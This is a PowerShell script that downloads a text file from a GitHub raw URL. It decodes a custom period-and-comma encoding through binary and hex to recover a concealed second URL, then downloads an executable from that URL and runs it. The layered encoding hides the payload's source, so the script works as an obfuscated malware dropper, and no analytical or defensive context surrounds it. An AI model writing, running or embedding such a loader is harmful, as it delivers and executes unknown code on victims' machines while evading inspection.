# Function to replace characters in the input string according to the custom encoding
Function Convert-CustomEncodingToBinaryString {
    Param ([string]$inputString)
    $binaryString = $inputString -replace ',', '0' -replace '\.', '1' -replace '/', ','
    return $binaryString
}

# Function to convert binary string (delimited by commas) to ASCII text
Function Convert-BinaryToText {
    Param ([string]$binaryInput)
    $asciiOutput = @()
    $binaryValues = $binaryInput -split ','

    foreach ($value in $binaryValues) {
        if ($value.Length -eq 8) {
            try {
                $asciiOutput += [convert]::ToChar([convert]::ToInt32($value, 2))
            } catch {
                Write-Error "Invalid binary value: $value"
                return $null
            }
        }
    }

    return -join $asciiOutput
}

# Function to convert hex string (delimited by commas) to ASCII text
Function Convert-HexToText {
    Param ([string]$hexInput)
    $asciiOutput = @()
    $hexValues = $hexInput -split ','

    foreach ($value in $hexValues) {
        if ($value.Length -eq 2) {
            try {
                $asciiOutput += [char][convert]::ToInt32($value, 16)
            } catch {
                Write-Error "Invalid hex value: $value"
                return $null
            }
        }
    }

    return -join $asciiOutput
}

# URL of the hosted text file
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/7.txt" # Replace this with the actual URL containing the custom encoded string

# Use Invoke-RestMethod to fetch the content from the URL
try {
    $rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
} catch {
    Write-Error "Error fetching the URL content: $_"
    exit
}

# Display the raw text content for troubleshooting
Write-Host "Raw text from URL:"
Write-Host $rawText

# Convert the raw text to a binary string according to the custom encoding
$binaryString = Convert-CustomEncodingToBinaryString -inputString $rawText

# Display the binary string for troubleshooting
Write-Host "Binary string from custom encoding:"
Write-Host $binaryString

# Convert the binary string to ASCII text (hex string)
$hexText = Convert-BinaryToText -binaryInput $binaryString
if (-not $hexText) {
    exit
}

# Display the hex string for troubleshooting
Write-Host "Hex string from binary:"
Write-Host $hexText

# Convert the hex string to ASCII text (URL)
$finalUrl = Convert-HexToText -hexInput $hexText
if (-not $finalUrl) {
    exit
}
$finalUrl = $finalUrl + 'e'

# Display the final URL for troubleshooting
Write-Host "Final URL from hex:"
Write-Host $finalUrl

# Specify the location where the file will be downloaded
$downloadPath = "S:\DownloadedFile.exe" # Change to your desired path and filename

# Download the file from the final URL
try {
    Invoke-WebRequest -Uri $finalUrl -OutFile $downloadPath -ErrorAction Stop
} catch {
    Write-Error "Error downloading the file: $_"
    exit
}

# Execute the downloaded file
if (Test-Path -Path $downloadPath) {
    try {
        Invoke-Item $downloadPath
    } catch {
        Write-Error "Error executing the file: $_"
    }
} else {
    Write-Error "The file at path $downloadPath does not exist."
}
